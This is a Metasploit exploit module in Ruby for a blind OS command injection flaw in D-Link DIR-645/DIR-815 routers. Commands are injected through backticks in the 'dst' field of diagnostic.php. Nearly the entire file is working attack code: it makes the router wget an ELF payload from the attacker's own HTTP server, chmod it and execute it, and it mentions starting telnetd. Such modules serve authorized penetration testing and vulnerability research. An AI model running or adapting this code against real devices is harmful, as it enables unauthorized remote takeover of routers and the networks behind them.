# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;DLink DIR-645 / DIR-815 diagnostic.php Command Execution&#039;,
      &#039;Description&#039; => %q{
          Some DLink Routers are vulnerable to OS Command injection in the web interface.
        On DIR-645 versions prior 1.03 authentication isn&#039;t needed to exploit it. On
        version 1.03 authentication is needed in order to trigger the vulnerability, which
        has been fixed definitely on version 1.04. Other DLink products, like DIR-300 rev B
        and DIR-600, are also affected by this vulnerability. Not every device includes
        wget which we need for deploying our payload. On such devices you could use the cmd
        generic payload and try to start telnetd or execute other commands. Since it is a
        blind os command injection vulnerability, there is no output for the executed
        command when using the cmd generic payload. A ping command against a controlled
        system could be used for testing purposes. This module has been tested successfully
        on DIR-645 prior to 1.03, where authentication isn&#039;t needed in order to exploit the
        vulnerability.
      },
      &#039;Author&#039;      =>
        [
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039;, # Vulnerability discovery and Metasploit module
          &#039;juan vazquez&#039; # minor help with msf module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;92144&#039; ],
          [ &#039;BID&#039;, &#039;58938&#039; ],
          [ &#039;EDB&#039;, &#039;24926&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-017&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 05 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;linux&#039;,&#039;unix&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;CMD&#039;,
            {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;
            }
          ],
          [ &#039;Linux mipsel Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_MIPSLE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 1
      ))
 
    register_options(
      [
        OptAddress.new(&#039;DOWNHOST&#039;, [ false, &#039;An alternative host to request the MIPS payload from&#039; ]),
        OptString.new(&#039;DOWNFILE&#039;, [ false, &#039;Filename to download, (default: random)&#039; ]),
        OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the ELF payload request&#039;, 60])
      ], self.class)
  end
 
 
  def request(cmd,uri)
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          "act" => "ping",
          "dst" => "` #{cmd}`"        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end
 
  def exploit
    downfile = datastore[&#039;DOWNFILE&#039;] || rand_text_alpha(8+rand(8))
    uri = &#039;/diagnostic.php&#039;
 
    if target.name =~ /CMD/
      if not (datastore[&#039;CMD&#039;])
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      res = request(cmd,uri)
      if (!res)
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      end
      print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      return
    end
 
    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
    @elf_sent = false
 
    #
    # start our server
    #
    resource_uri = &#039;/&#039; + downfile
 
    if (datastore[&#039;DOWNHOST&#039;])
      service_url = &#039;http://&#039; + datastore[&#039;DOWNHOST&#039;] + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
    else
      #do not use SSL
      if datastore[&#039;SSL&#039;]
        ssl_restore = true
        datastore[&#039;SSL&#039;] = false
      end
 
      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore[&#039;SRVHOST&#039;] == "0.0.0.0" or datastore[&#039;SRVHOST&#039;] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore[&#039;SRVHOST&#039;]
      end
 
      service_url = &#039;http://&#039; + srv_host + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
 
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => resource_uri
      }})
 
      datastore[&#039;SSL&#039;] = true if ssl_restore
    end
 
    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the DLink device to download #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(8)
 
    #not working if we send all command together -> lets take three requests
    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}"
    res = request(cmd,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
 
    # wait for payload download
    if (datastore[&#039;DOWNHOST&#039;])
      print_status("#{rhost}:#{rport} - Giving #{datastore[&#039;HTTP_DELAY&#039;]} seconds to the Dlink device to download the payload")
      select(nil, nil, nil, datastore[&#039;HTTP_DELAY&#039;])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")
 
    #
    # chmod
    #
    cmd = "chmod 777 /tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Dlink device to chmod #{downfile}")
    res = request(cmd,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
 
    #
    # execute
    #
    cmd = "/tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Dlink device to execute #{downfile}")
    res = request(cmd,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
 
  end
 
  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn&#039;t ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end
 
  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")
 
    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;HTTP_DELAY&#039;])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end
 
end

